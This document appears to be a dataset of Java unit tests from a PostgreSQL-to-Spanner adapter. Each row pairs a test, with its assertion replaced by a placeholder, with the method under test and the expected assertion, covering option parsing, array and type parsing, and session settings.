"testPrintError() { ByteArrayOutputStream byteArrayStream = new ByteArrayOutputStream(); PrintStream out = new PrintStream(byteArrayStream); Exception exception = new Exception(""test exception""); String expectedPGAdapterVersion = Server.getVersion();  Server.printError(exception, out, out);  ""<AssertPlaceHolder>""; }
printError(Exception exception, PrintStream err, PrintStream out) { err.printf( ""The server could not be started because an error occurred: %s\n"", (exception.getMessage() == null ? exception.toString() : exception.getMessage())); out.print(""Run with option -h or --help to get help\n""); out.printf(""Version: %s\n"", getVersion()); }"	"assertEquals( ""The server could not be started because an error occurred: "" + exception.getMessage() + ""\n"" + ""Run with option -h or --help to get help\n"" + ""Version: "" + expectedPGAdapterVersion + ""\n"", byteArrayStream.toString())"
"ParseException { final JSONObject expected = new JSONObject(ImmutableMap.of(""commands"", new JSONArray()));  final JSONObject actual = parser.emptyCommands();  ""<AssertPlaceHolder>""; }
emptyCommands() throws IOException, ParseException { return parse(this.getClass().getClassLoader().getResourceAsStream(EMPTY_FILE)); }"	assertEquals(expected, actual)
"ParseException { final JSONObject actual = parser.defaultCommands();  ""<AssertPlaceHolder>""; }
defaultCommands() throws IOException, ParseException { return parse(this.getClass().getClassLoader().getResourceAsStream(DEFAULT_FILE)); }"	assertNotNull(actual)
"testDefaultMaxBacklog() { OptionsMetadata options = new OptionsMetadata(new String[] {""-p"", ""p"", ""-i"", ""i"", ""-c"", ""credentials.json""}); ""<AssertPlaceHolder>""; }
getMaxBacklog() { return this.maxBacklog; }"	assertEquals(1000, options.getMaxBacklog())
"testCustomMaxBacklog() { OptionsMetadata options = new OptionsMetadata( new String[] {""-p"", ""p"", ""-i"", ""i"", ""-max_backlog"", ""100"", ""-c"", ""credentials.json""}); ""<AssertPlaceHolder>""; }
getMaxBacklog() { return this.maxBacklog; }"	assertEquals(100, options.getMaxBacklog())
"testShouldAuthenticate() { OptionsMetadata options = new OptionsMetadata(new String[] {""-a""}); ""<AssertPlaceHolder>""; }
shouldAuthenticate() { return this.authenticate; }"	assertTrue(options.shouldAuthenticate())
"testStripJdbcPrefix() { ""<AssertPlaceHolder>""; }
getDefaultConnectionUrl() { return defaultConnectionUrl; }"	"assertEquals( ""cloudspanner:/projects/my-project/instances/my-instance/databases/my-database"", new OptionsMetadata( Collections.emptyMap(), ""linux"", ""jdbc:cloudspanner:/projects/my-project/instances/my-instance/databases/my-database"", 5432, TextFormat.POSTGRESQL, false, false, false, false, null) .getDefaultConnectionUrl())"
"testInt64StringParse() { ArrayParser parser = new ArrayParser( createArrayResultSet(Type.int64(), Value.int64Array(Arrays.asList(1L, null, 2L))), 0, mock(SessionState.class));  ""<AssertPlaceHolder>""; }
stringParse() { if (this.item == null) { return null; } List<String> results = new LinkedList<>(); for (Object currentItem : this.item) { results.add( stringify( Parser.create(currentItem, this.arrayElementType.getCode(), sessionState) .stringParse())); } return results.stream() .collect(Collectors.joining(ARRAY_DELIMITER, PG_ARRAY_OPEN, PG_ARRAY_CLOSE)); }"	"assertEquals(""{1,NULL,2}"", parser.stringParse())"
"testBoolStringParse() { ArrayParser parser = new ArrayParser( createArrayResultSet(Type.bool(), Value.boolArray(Arrays.asList(true, null, false))), 0, mock(SessionState.class));  ""<AssertPlaceHolder>""; }
stringParse() { if (this.item == null) { return null; } List<String> results = new LinkedList<>(); for (Object currentItem : this.item) { results.add( stringify( Parser.create(currentItem, this.arrayElementType.getCode(), sessionState) .stringParse())); } return results.stream() .collect(Collectors.joining(ARRAY_DELIMITER, PG_ARRAY_OPEN, PG_ARRAY_CLOSE)); }"	"assertEquals(""{t,NULL,f}"", parser.stringParse())"
"testBytesStringParse() { ArrayParser parser = new ArrayParser( createArrayResultSet( Type.bytes(), Value.bytesArray( Arrays.asList(ByteArray.copyFrom(""test1""), null, ByteArray.copyFrom(""test2"")))), 0, mock(SessionState.class));  ""<AssertPlaceHolder>""; }
stringParse() { if (this.item == null) { return null; } List<String> results = new LinkedList<>(); for (Object currentItem : this.item) { results.add( stringify( Parser.create(currentItem, this.arrayElementType.getCode(), sessionState) .stringParse())); } return results.stream() .collect(Collectors.joining(ARRAY_DELIMITER, PG_ARRAY_OPEN, PG_ARRAY_CLOSE)); }"	"assertEquals(""{""\\\\x7465737431"",NULL,""\\\\x7465737432""}"", parser.stringParse())"
"testFloat64StringParse() { ArrayParser parser = new ArrayParser( createArrayResultSet( Type.float64(), Value.float64Array(Arrays.asList(3.14, null, 6.626))), 0, mock(SessionState.class));  ""<AssertPlaceHolder>""; }
stringParse() { if (this.item == null) { return null; } List<String> results = new LinkedList<>(); for (Object currentItem : this.item) { results.add( stringify( Parser.create(currentItem, this.arrayElementType.getCode(), sessionState) .stringParse())); } return results.stream() .collect(Collectors.joining(ARRAY_DELIMITER, PG_ARRAY_OPEN, PG_ARRAY_CLOSE)); }"	"assertEquals(""{3.14,NULL,6.626}"", parser.stringParse())"
"testNumericStringParse() { ArrayParser parser = new ArrayParser( createArrayResultSet( Type.pgNumeric(), Value.pgNumericArray(Arrays.asList(""3.14"", null, ""6.626""))), 0, mock(SessionState.class));  ""<AssertPlaceHolder>""; }
stringParse() { if (this.item == null) { return null; } List<String> results = new LinkedList<>(); for (Object currentItem : this.item) { results.add( stringify( Parser.create(currentItem, this.arrayElementType.getCode(), sessionState) .stringParse())); } return results.stream() .collect(Collectors.joining(ARRAY_DELIMITER, PG_ARRAY_OPEN, PG_ARRAY_CLOSE)); }"	"assertEquals(""{3.14,NULL,6.626}"", parser.stringParse())"
"testDateStringParse() { ArrayParser parser = new ArrayParser( createArrayResultSet( Type.date(), Value.dateArray( Arrays.asList( Date.parseDate(""2022-07-08""), null, Date.parseDate(""2000-01-01"")))), 0, mock(SessionState.class));  ""<AssertPlaceHolder>""; }
stringParse() { if (this.item == null) { return null; } List<String> results = new LinkedList<>(); for (Object currentItem : this.item) { results.add( stringify( Parser.create(currentItem, this.arrayElementType.getCode(), sessionState) .stringParse())); } return results.stream() .collect(Collectors.joining(ARRAY_DELIMITER, PG_ARRAY_OPEN, PG_ARRAY_CLOSE)); }"	"assertEquals(""{""2022-07-08"",NULL,""2000-01-01""}"", parser.stringParse())"
"testTimestampStringParse() { SessionState sessionState = mock(SessionState.class); when(sessionState.getTimezone()).thenReturn(ZoneId.of(""UTC""));  ArrayParser parser = new ArrayParser( createArrayResultSet( Type.timestamp(), Value.timestampArray( Arrays.asList( Timestamp.parseTimestamp(""2022-07-08T07:00:02.123456789Z""), null, Timestamp.parseTimestamp(""2000-01-01T00:00:00Z"")))), 0, sessionState);  ""<AssertPlaceHolder>""; }
stringParse() { if (this.item == null) { return null; } List<String> results = new LinkedList<>(); for (Object currentItem : this.item) { results.add( stringify( Parser.create(currentItem, this.arrayElementType.getCode(), sessionState) .stringParse())); } return results.stream() .collect(Collectors.joining(ARRAY_DELIMITER, PG_ARRAY_OPEN, PG_ARRAY_CLOSE)); }"	"assertEquals( ""{""2022-07-08 07:00:02.123456+00"",NULL,""2000-01-01 00:00:00+00""}"", parser.stringParse())"
"testStringStringParse() { ArrayParser parser = new ArrayParser( createArrayResultSet( Type.string(), Value.stringArray(Arrays.asList(""test1"", null, ""test2""))), 0, mock(SessionState.class));  ""<AssertPlaceHolder>""; }
stringParse() { if (this.item == null) { return null; } List<String> results = new LinkedList<>(); for (Object currentItem : this.item) { results.add( stringify( Parser.create(currentItem, this.arrayElementType.getCode(), sessionState) .stringParse())); } return results.stream() .collect(Collectors.joining(ARRAY_DELIMITER, PG_ARRAY_OPEN, PG_ARRAY_CLOSE)); }"	"assertEquals(""{""test1"",NULL,""test2""}"", parser.stringParse())"
"testJsonStringParse() { ArrayParser parser = new ArrayParser( createArrayResultSet( Type.pgJsonb(), Value.pgJsonbArray( Arrays.asList(""{""key"": ""value1""}"", null, ""{""key"": ""value2""}""))), 0, mock(SessionState.class));  ""<AssertPlaceHolder>""; }
stringParse() { if (this.item == null) { return null; } List<String> results = new LinkedList<>(); for (Object currentItem : this.item) { results.add( stringify( Parser.create(currentItem, this.arrayElementType.getCode(), sessionState) .stringParse())); } return results.stream() .collect(Collectors.joining(ARRAY_DELIMITER, PG_ARRAY_OPEN, PG_ARRAY_CLOSE)); }"	"assertEquals( ""{""{\\""key\\"": \\""value1\\""}"",NULL,""{\\""key\\"": \\""value2\\""}""}"", parser.stringParse())"
"testBytesToHex() { Random random = new Random(); byte[] value = new byte[random.nextInt(1024) + 1]; random.nextBytes(value); ""<AssertPlaceHolder>""; }
bytesToHex(byte[] bytes) { byte[] hexChars = new byte[bytes.length * 2 + 2]; hexChars[0] = '\'; hexChars[1] = 'x'; for (int j = 0; j < bytes.length; j++) { int v = bytes[j] & 0xFF; hexChars[j * 2 + 2] = HEX_ARRAY[v >>> 4]; hexChars[j * 2 + 3] = HEX_ARRAY[v & 0x0F]; } return hexChars; }"	"assertEquals(""\\x"" + Utils.toHexString(value), new String(BinaryParser.bytesToHex(value)))"
"testBind() { Statement.Builder builder = Statement.newBuilder(""select $1""); new JsonbParser(""{""key"": ""value""}"".getBytes(StandardCharsets.UTF_8), FormatCode.TEXT) .bind(builder, ""p1""); ""<AssertPlaceHolder>""; }
bind(Statement.Builder statementBuilder, String name) { statementBuilder.bind(name).to(Value.pgJsonb(this.item)); }"	"assertEquals(""{""key"": ""value""}"", builder.build().getParameters().get(""p1"").getString())"
"testTimestampParsingBytePart() { Timestamp value = Timestamp.ofTimeMicroseconds(904910400000000L);  byte[] byteResult = {-1, -1, -38, 1, -93, -70, 48, 0};  TimestampParser parsedValue = new TimestampParser(value, mock(SessionState.class));  ""<AssertPlaceHolder>""; validateCreateBinary(byteResult, Oid.TIMESTAMP, value); }
parse(DataFormat format) { switch (format) { case SPANNER: return this.spannerBinaryParse(); case POSTGRESQL_TEXT: return this.stringBinaryParse(); case POSTGRESQL_BINARY: return this.binaryParse(); default: throw new IllegalArgumentException(""Unknown format: "" + format); } }"	assertArrayEquals(byteResult, parsedValue.parse(DataFormat.POSTGRESQL_BINARY))
"testNumericParsing() { String value = ""1234567890.1234567890"";  byte[] byteResult = ByteConverter.numeric(new BigDecimal(""1234567890.1234567890"")); byte[] stringResult = { '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '.', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0' };  NumericParser parser = new NumericParser(value);  validate(parser, byteResult, stringResult, stringResult); ""<AssertPlaceHolder>""; validateCreateBinary(byteResult, Oid.NUMERIC, value); validateCreateText(stringResult, Oid.NUMERIC, value); }
getItem() { return this.item; }"	assertEquals(value, parser.getItem())
"testNumericParsingNaN() { String value = ""NaN""; byte[] byteResult = new byte[8]; ByteConverter.int2(byteResult, 4, (short) 0xC000);  byte[] stringResult = {'N', 'a', 'N'};  NumericParser parser = new NumericParser(value);  validate(parser, byteResult, stringResult, stringResult); ""<AssertPlaceHolder>""; validateCreateText(stringResult, Oid.NUMERIC, value); }
getItem() { return this.item; }"	assertEquals(value, parser.getItem())
"testParseInt8Array() { ""<AssertPlaceHolder>""; }
getItem() { return this.item; }"	"assertEquals( Arrays.asList(1L, null, 2L), Parser.create( mock(SessionState.class), ""{1,null,2}"".getBytes(StandardCharsets.UTF_8), Oid.INT8_ARRAY, FormatCode.TEXT) .getItem())"
"testParseInt4Array() { ""<AssertPlaceHolder>""; }
getItem() { return this.item; }"	"assertEquals( Arrays.asList(1, null, 2), Parser.create( mock(SessionState.class), ""{1,null,2}"".getBytes(StandardCharsets.UTF_8), Oid.INT4_ARRAY, FormatCode.TEXT) .getItem())"
"testParseInt2Array() { ""<AssertPlaceHolder>""; }
getItem() { return this.item; }"	"assertEquals( Arrays.asList((short) 1, null, (short) 2), Parser.create( mock(SessionState.class), ""{1,null,2}"".getBytes(StandardCharsets.UTF_8), Oid.INT2_ARRAY, FormatCode.TEXT) .getItem())"
"testParseBoolArray() { ""<AssertPlaceHolder>""; }
getItem() { return this.item; }"	"assertEquals( Arrays.asList(true, null, false), Parser.create( mock(SessionState.class), ""{t,null,f}"".getBytes(StandardCharsets.UTF_8), Oid.BOOL_ARRAY, FormatCode.TEXT) .getItem())"
"testParseFloat8Array() { ""<AssertPlaceHolder>""; }
getItem() { return this.item; }"	"assertEquals( Arrays.asList(3.14d, null, -99.99d), Parser.create( mock(SessionState.class), ""{3.14,null,-99.99}"".getBytes(StandardCharsets.UTF_8), Oid.FLOAT8_ARRAY, FormatCode.TEXT) .getItem())"
"testParseFloat4Array() { ""<AssertPlaceHolder>""; }
getItem() { return this.item; }"	"assertEquals( Arrays.asList(3.14f, null, -99.99f), Parser.create( mock(SessionState.class), ""{3.14,null,-99.99}"".getBytes(StandardCharsets.UTF_8), Oid.FLOAT4_ARRAY, FormatCode.TEXT) .getItem())"
"testParseByteaArray() { ""<AssertPlaceHolder>""; }
getItem() { return this.item; }"	"assertEquals( Arrays.asList(ByteArray.copyFrom(""bytes1""), null, ByteArray.copyFrom(""bytes2"")), Parser.create( mock(SessionState.class), (""{""\"" + new String( BinaryParser.bytesToHex(""bytes1"".getBytes(StandardCharsets.UTF_8)), StandardCharsets.UTF_8) + """",null,""\"" + new String( BinaryParser.bytesToHex(""bytes2"".getBytes(StandardCharsets.UTF_8)), StandardCharsets.UTF_8) + """"}"") .getBytes(StandardCharsets.UTF_8), Oid.BYTEA_ARRAY, FormatCode.TEXT) .getItem())"
"testParseVarcharArray() { ""<AssertPlaceHolder>""; }
getItem() { return this.item; }"	"assertEquals( Arrays.asList(""string1"", null, ""string2""), Parser.create( mock(SessionState.class), ""{""string1"",null,""string2""}"".getBytes(StandardCharsets.UTF_8), Oid.VARCHAR_ARRAY, FormatCode.TEXT) .getItem())"
"testParseTextArray() { ""<AssertPlaceHolder>""; }
getItem() { return this.item; }"	"assertEquals( Arrays.asList(""string1"", null, ""string2""), Parser.create( mock(SessionState.class), ""{""string1"",null,""string2""}"".getBytes(StandardCharsets.UTF_8), Oid.TEXT_ARRAY, FormatCode.TEXT) .getItem())"
"testParseUuidArray() { ""<AssertPlaceHolder>""; }
getItem() { return this.item; }"	"assertEquals( Arrays.asList( ""1e4d8cd3-099d-4954-a5c1-85272713c3e9"", null, ""5fab5fcf-3c39-42cf-b41e-b40f1a9c3bdd""), Parser.create( mock(SessionState.class), ""{""1e4d8cd3-099d-4954-a5c1-85272713c3e9"",null,""5fab5fcf-3c39-42cf-b41e-b40f1a9c3bdd""}"" .getBytes(StandardCharsets.UTF_8), Oid.TEXT_ARRAY, FormatCode.TEXT) .getItem())"
"testParseDateArray() { ""<AssertPlaceHolder>""; }
getItem() { return this.item; }"	"assertEquals( Arrays.asList(Date.parseDate(""2000-01-01""), null, Date.parseDate(""1970-01-01"")), Parser.create( mock(SessionState.class), ""{""2000-01-01"",null,""1970-01-01""}"".getBytes(StandardCharsets.UTF_8), Oid.DATE_ARRAY, FormatCode.TEXT) .getItem())"
"testParseTimestamptzArray() { SessionState sessionState = mock(SessionState.class); when(sessionState.getTimezone()).thenReturn(ZoneId.of(""Europe/Amsterdam"")); ""<AssertPlaceHolder>""; }
getItem() { return this.item; }"	"assertEquals( Arrays.asList( Timestamp.parseTimestamp(""2023-02-14T13:38:00.123456Z""), null, Timestamp.parseTimestamp(""2000-01-01T00:00:00Z"")), Parser.create( sessionState, ""{""2023-02-14 14:38:00.123456"",null,""2000-01-01 00:00:00+00""}"" .getBytes(StandardCharsets.UTF_8), Oid.TIMESTAMPTZ_ARRAY, FormatCode.TEXT) .getItem())"
"testParseTimestampArray() { SessionState sessionState = mock(SessionState.class); when(sessionState.getTimezone()).thenReturn(ZoneId.of(""America/Los_Angeles"")); ""<AssertPlaceHolder>""; }
getItem() { return this.item; }"	"assertEquals( Arrays.asList( Timestamp.parseTimestamp(""2023-02-15T02:38:00.123456000Z""), null, Timestamp.parseTimestamp(""2000-01-01T00:00:00Z"")), Parser.create( sessionState, ""{""2023-02-14 18:38:00.123456"",null,""2000-01-01 00:00:00+00""}"" .getBytes(StandardCharsets.UTF_8), Oid.TIMESTAMP_ARRAY, FormatCode.TEXT) .getItem())"
"testParseJsonbArray() { ""<AssertPlaceHolder>""; }
getItem() { return this.item; }"	"assertEquals( Arrays.asList(""{""key"": ""value""}"", null, ""{""key"": [0, 1]}""), Parser.create( mock(SessionState.class), ""{""{\\""key\\"": \\""value\\""}"", null, ""{\\""key\\"": [0, 1]}""}"" .getBytes(StandardCharsets.UTF_8), Oid.TEXT_ARRAY, FormatCode.TEXT) .getItem())"
"testGetAll() { SessionState state = new SessionState(mock(OptionsMetadata.class)); List<PGSetting> allSettings = state.getAll(); ""<AssertPlaceHolder>""; }
getAll() { List<PGSetting> result = new ArrayList<>( (localSettings == null ? 0 : localSettings.size()) + (transactionSettings == null ? 0 : transactionSettings.size()) + settings.size()); Set<String> keys = Sets.union( settings.keySet(), Sets.union( localSettings == null ? Collections.emptySet() : localSettings.keySet(), transactionSettings == null ? Collections.emptySet() : transactionSettings.keySet())); for (String key : keys) { result.add(internalGet(key, true)); } result.sort(Comparator.comparing(PGSetting::getCasePreservingKey)); return result; }"	assertEquals(360, allSettings.size())
"testGeneratePGSettingsCte() { SessionState state = new SessionState(mock(OptionsMetadata.class));  String cte = state.generatePGSettingsCte();  ""<AssertPlaceHolder>""; }
generatePGSettingsCte() { return ""pg_settings_inmem_ as (\n"" + getAll().stream() .filter(setting -> SUPPORTED_PG_SETTINGS_KEYS.contains(setting.getCasePreservingKey())) .map(PGSetting::getSelectStatement) .collect(Collectors.joining(""\nunion all\n"")) + ""\n),\n"" + ""pg_settings_names_ as (\n"" + ""select name from pg_settings_inmem_\n"" + ""union\n"" + ""select name from pg_catalog.pg_settings\n"" + ""),\n"" + ""pg_settings as (\n"" + ""select n.name, "" + generatePgSettingsColumnExpressions() + ""\n"" + ""from pg_settings_names_ n\n"" + ""left join pg_settings_inmem_ s1 using (name)\n"" + ""left join pg_catalog.pg_settings s2 using (name)\n"" + ""order by name\n"" + "")\n""; }"	assertEquals(getDefaultSessionStateExpression(), cte)
"testIsReplacePgCatalogTables_noDefault() { SessionState state = new SessionState(mock(OptionsMetadata.class)); ""<AssertPlaceHolder>""; }
isReplacePgCatalogTables() { PGSetting setting = internalGet(toKey(""spanner"", ""replace_pg_catalog_tables""), false); if (setting == null) { return true; } return tryGetFirstNonNull( true, () -> BooleanParser.toBoolean(setting.getSetting()), () -> BooleanParser.toBoolean(setting.getResetVal()), () -> BooleanParser.toBoolean(setting.getBootVal())); }"	assertFalse(state.isReplacePgCatalogTables())
"testIsReplacePgCatalogTables_defaultFalse() { OptionsMetadata optionsMetadata = mock(OptionsMetadata.class); when(optionsMetadata.replacePgCatalogTables()).thenReturn(false); SessionState state = new SessionState( ImmutableMap.of( ""spanner.replace_pg_catalog_tables"", new PGSetting(""spanner"", ""replace_pg_catalog_tables"")), optionsMetadata); ""<AssertPlaceHolder>""; }
isReplacePgCatalogTables() { PGSetting setting = internalGet(toKey(""spanner"", ""replace_pg_catalog_tables""), false); if (setting == null) { return true; } return tryGetFirstNonNull( true, () -> BooleanParser.toBoolean(setting.getSetting()), () -> BooleanParser.toBoolean(setting.getResetVal()), () -> BooleanParser.toBoolean(setting.getBootVal())); }"	assertFalse(state.isReplacePgCatalogTables())
"testIsReplacePgCatalogTables_defaultTrue() { OptionsMetadata optionsMetadata = mock(OptionsMetadata.class); when(optionsMetadata.replacePgCatalogTables()).thenReturn(true); SessionState state = new SessionState( ImmutableMap.of( ""spanner.replace_pg_catalog_tables"", new PGSetting(""spanner"", ""replace_pg_catalog_tables"")), optionsMetadata); ""<AssertPlaceHolder>""; }
isReplacePgCatalogTables() { PGSetting setting = internalGet(toKey(""spanner"", ""replace_pg_catalog_tables""), false); if (setting == null) { return true; } return tryGetFirstNonNull( true, () -> BooleanParser.toBoolean(setting.getSetting()), () -> BooleanParser.toBoolean(setting.getResetVal()), () -> BooleanParser.toBoolean(setting.getBootVal())); }"	assertTrue(state.isReplacePgCatalogTables())
"testIsReplacePgCatalogTables_resetVal() { OptionsMetadata optionsMetadata = mock(OptionsMetadata.class); PGSetting setting = new PGSetting( ""spanner"", ""replace_pg_catalog_tables"", null, null, null, null, null, null, null, null, null, null, null, null, /* resetVal = */ ""off"", null, null, false); SessionState state = new SessionState( ImmutableMap.of(""spanner.replace_pg_catalog_tables"", setting), optionsMetadata); state.set(""spanner"", ""replace_pg_catalog_tables"", null);  ""<AssertPlaceHolder>""; }
isReplacePgCatalogTables() { PGSetting setting = internalGet(toKey(""spanner"", ""replace_pg_catalog_tables""), false); if (setting == null) { return true; } return tryGetFirstNonNull( true, () -> BooleanParser.toBoolean(setting.getSetting()), () -> BooleanParser.toBoolean(setting.getResetVal()), () -> BooleanParser.toBoolean(setting.getBootVal())); }"	assertFalse(state.isReplacePgCatalogTables())
"testIsReplacePgCatalogTables_bootVal() { OptionsMetadata optionsMetadata = mock(OptionsMetadata.class); PGSetting setting = new PGSetting( ""spanner"", ""replace_pg_catalog_tables"", null, null, null, null, null, null, null, null, null, null, null, /* bootVal = */ ""off"", null, null, null, false); SessionState state = new SessionState( ImmutableMap.of(""spanner.replace_pg_catalog_tables"", setting), optionsMetadata); state.set(""spanner"", ""replace_pg_catalog_tables"", null);  ""<AssertPlaceHolder>""; }
isReplacePgCatalogTables() { PGSetting setting = internalGet(toKey(""spanner"", ""replace_pg_catalog_tables""), false); if (setting == null) { return true; } return tryGetFirstNonNull( true, () -> BooleanParser.toBoolean(setting.getSetting()), () -> BooleanParser.toBoolean(setting.getResetVal()), () -> BooleanParser.toBoolean(setting.getBootVal())); }"	assertFalse(state.isReplacePgCatalogTables())
"testIsEmulatePgClassTables_resetVal() { OptionsMetadata optionsMetadata = mock(OptionsMetadata.class); PGSetting setting = new PGSetting( ""spanner"", ""emulate_pg_class_tables"", null, null, null, null, null, null, null, null, null, null, null, null, /* resetVal = */ ""off"", null, null, false); SessionState state = new SessionState( ImmutableMap.of(""spanner.emulate_pg_class_tables"", setting), optionsMetadata); state.set(""spanner"", ""emulate_pg_class_tables"", null);  ""<AssertPlaceHolder>""; }
isEmulatePgClassTables() { PGSetting setting = internalGet(toKey(""spanner"", ""emulate_pg_class_tables""), false); if (setting == null) { return false; } return tryGetFirstNonNull( true, () -> BooleanParser.toBoolean(setting.getSetting()), () -> BooleanParser.toBoolean(setting.getResetVal()), () -> BooleanParser.toBoolean(setting.getBootVal())); }"	assertFalse(state.isEmulatePgClassTables())
"testIsEmulatePgClassTables_bootVal() { OptionsMetadata optionsMetadata = mock(OptionsMetadata.class); PGSetting setting = new PGSetting( ""spanner"", ""emulate_pg_class_tables"", null, null, null, null, null, null, null, null, null, null, null, /* bootVal = */ ""off"", null, null, null, false); SessionState state = new SessionState( ImmutableMap.of(""spanner.emulate_pg_class_tables"", setting), optionsMetadata); state.set(""spanner"", ""emulate_pg_class_tables"", null);  ""<AssertPlaceHolder>""; }
isEmulatePgClassTables() { PGSetting setting = internalGet(toKey(""spanner"", ""emulate_pg_class_tables""), false); if (setting == null) { return false; } return tryGetFirstNonNull( true, () -> BooleanParser.toBoolean(setting.getSetting()), () -> BooleanParser.toBoolean(setting.getResetVal()), () -> BooleanParser.toBoolean(setting.getBootVal())); }"	assertFalse(state.isEmulatePgClassTables())
"testIsEmulatePgClassTables_NoValue() { OptionsMetadata optionsMetadata = mock(OptionsMetadata.class); SessionState state = new SessionState(ImmutableMap.of(), optionsMetadata); state.getSettings().clear(); ""<AssertPlaceHolder>""; }
isEmulatePgClassTables() { PGSetting setting = internalGet(toKey(""spanner"", ""emulate_pg_class_tables""), false); if (setting == null) { return false; } return tryGetFirstNonNull( true, () -> BooleanParser.toBoolean(setting.getSetting()), () -> BooleanParser.toBoolean(setting.getResetVal()), () -> BooleanParser.toBoolean(setting.getBootVal())); }"	assertFalse(state.isEmulatePgClassTables())
"testDdlTransactionMode_noDefault() { SessionState state = new SessionState(ImmutableMap.of(), mock(OptionsMetadata.class)); ""<AssertPlaceHolder>""; }
getDdlTransactionMode() { PGSetting setting = internalGet(toKey(""spanner"", ""ddl_transaction_mode""), false); if (setting == null) { return DdlTransactionMode.Batch; } return tryGetFirstNonNull( DdlTransactionMode.Batch, () -> DdlTransactionMode.valueOf(setting.getSetting()), () -> DdlTransactionMode.valueOf(setting.getResetVal()), () -> DdlTransactionMode.valueOf(setting.getBootVal())); }"	assertEquals(DdlTransactionMode.Batch, state.getDdlTransactionMode())
"testDdlTransactionMode_defaultSingle() { OptionsMetadata optionsMetadata = mock(OptionsMetadata.class); when(optionsMetadata.getDdlTransactionMode()).thenReturn(DdlTransactionMode.Single); SessionState state = new SessionState( ImmutableMap.of( ""spanner.ddl_transaction_mode"", new PGSetting(""spanner"", ""ddl_transaction_mode"")), optionsMetadata); ""<AssertPlaceHolder>""; }
getDdlTransactionMode() { PGSetting setting = internalGet(toKey(""spanner"", ""ddl_transaction_mode""), false); if (setting == null) { return DdlTransactionMode.Batch; } return tryGetFirstNonNull( DdlTransactionMode.Batch, () -> DdlTransactionMode.valueOf(setting.getSetting()), () -> DdlTransactionMode.valueOf(setting.getResetVal()), () -> DdlTransactionMode.valueOf(setting.getBootVal())); }"	assertEquals(DdlTransactionMode.Single, state.getDdlTransactionMode())
"testDdlTransactionMode_defaultExplicit() { OptionsMetadata optionsMetadata = mock(OptionsMetadata.class); when(optionsMetadata.getDdlTransactionMode()) .thenReturn(DdlTransactionMode.AutocommitExplicitTransaction); SessionState state = new SessionState( ImmutableMap.of( ""spanner.ddl_transaction_mode"", new PGSetting(""spanner"", ""ddl_transaction_mode"")), optionsMetadata); ""<AssertPlaceHolder>""; }
getDdlTransactionMode() { PGSetting setting = internalGet(toKey(""spanner"", ""ddl_transaction_mode""), false); if (setting == null) { return DdlTransactionMode.Batch; } return tryGetFirstNonNull( DdlTransactionMode.Batch, () -> DdlTransactionMode.valueOf(setting.getSetting()), () -> DdlTransactionMode.valueOf(setting.getResetVal()), () -> DdlTransactionMode.valueOf(setting.getBootVal())); }"	assertEquals(DdlTransactionMode.AutocommitExplicitTransaction, state.getDdlTransactionMode())
"testDdlTransactionMode_resetVal() { OptionsMetadata optionsMetadata = mock(OptionsMetadata.class); PGSetting setting = new PGSetting( ""spanner"", ""ddl_transaction_mode"", null, null, null, null, null, null, null, null, null, null, null, null, /* resetVal = */ ""Single"", null, null, false); SessionState state = new SessionState(ImmutableMap.of(""spanner.ddl_transaction_mode"", setting), optionsMetadata); state.set(""spanner"", ""ddl_transaction_mode"", null);  ""<AssertPlaceHolder>""; }
getDdlTransactionMode() { PGSetting setting = internalGet(toKey(""spanner"", ""ddl_transaction_mode""), false); if (setting == null) { return DdlTransactionMode.Batch; } return tryGetFirstNonNull( DdlTransactionMode.Batch, () -> DdlTransactionMode.valueOf(setting.getSetting()), () -> DdlTransactionMode.valueOf(setting.getResetVal()), () -> DdlTransactionMode.valueOf(setting.getBootVal())); }"	assertEquals(DdlTransactionMode.Single, state.getDdlTransactionMode())
"testDdlTransactionMode_bootVal() { OptionsMetadata optionsMetadata = mock(OptionsMetadata.class); PGSetting setting = new PGSetting( ""spanner"", ""ddl_transaction_mode"", null, null, null, null, null, null, null, null, null, null, null, /* bootVal = */ ""Single"", null, null, null, false); SessionState state = new SessionState(ImmutableMap.of(""spanner.ddl_transaction_mode"", setting), optionsMetadata); state.set(""spanner"", ""ddl_transaction_mode"", null);  ""<AssertPlaceHolder>""; }
getDdlTransactionMode() { PGSetting setting = internalGet(toKey(""spanner"", ""ddl_transaction_mode""), false); if (setting == null) { return DdlTransactionMode.Batch; } return tryGetFirstNonNull( DdlTransactionMode.Batch, () -> DdlTransactionMode.valueOf(setting.getSetting()), () -> DdlTransactionMode.valueOf(setting.getResetVal()), () -> DdlTransactionMode.valueOf(setting.getBootVal())); }"	assertEquals(DdlTransactionMode.Single, state.getDdlTransactionMode())
"testGetDefaultTimeZone() { Map<String, PGSetting> originalSettings = ImmutableMap.copyOf(SessionState.SERVER_SETTINGS); SessionState.SERVER_SETTINGS.remove(""TimeZone""); try { OptionsMetadata optionsMetadata = mock(OptionsMetadata.class); SessionState state = new SessionState(ImmutableMap.of(), optionsMetadata); ""<AssertPlaceHolder>""; } finally { SessionState.SERVER_SETTINGS.putAll(originalSettings); } }
getTimezone() { if (cachedZoneId != null) { return cachedZoneId; } PGSetting setting = internalGet(toKey(null, ""timezone""), false); if (setting == null) { return ZoneId.systemDefault(); } String id = tryGetFirstNonNull( ZoneId.systemDefault().getId(), setting::getSetting, setting::getResetVal, setting::getBootVal);  return (cachedZoneId = zoneIdFromString(id)); }"	assertEquals(TimeZone.getDefault().toZoneId(), state.getTimezone())
"testTimeZoneResetVal() { Map<String, PGSetting> originalSettings = ImmutableMap.copyOf(SessionState.SERVER_SETTINGS); SessionState.SERVER_SETTINGS.put( ""TimeZone"", new PGSetting( null, ""TimeZone"", null, null, null, null, null, null, null, null, null, null, null, ""Europe/Oslo"", ""America/New_York"", null, null, false)); try { OptionsMetadata optionsMetadata = mock(OptionsMetadata.class); SessionState state = new SessionState(ImmutableMap.of(), optionsMetadata); ""<AssertPlaceHolder>""; } finally { SessionState.SERVER_SETTINGS.putAll(originalSettings); } }
getTimezone() { if (cachedZoneId != null) { return cachedZoneId; } PGSetting setting = internalGet(toKey(null, ""timezone""), false); if (setting == null) { return ZoneId.systemDefault(); } String id = tryGetFirstNonNull( ZoneId.systemDefault().getId(), setting::getSetting, setting::getResetVal, setting::getBootVal);  return (cachedZoneId = zoneIdFromString(id)); }"	"assertEquals(""America/New_York"", state.getTimezone().getId())"
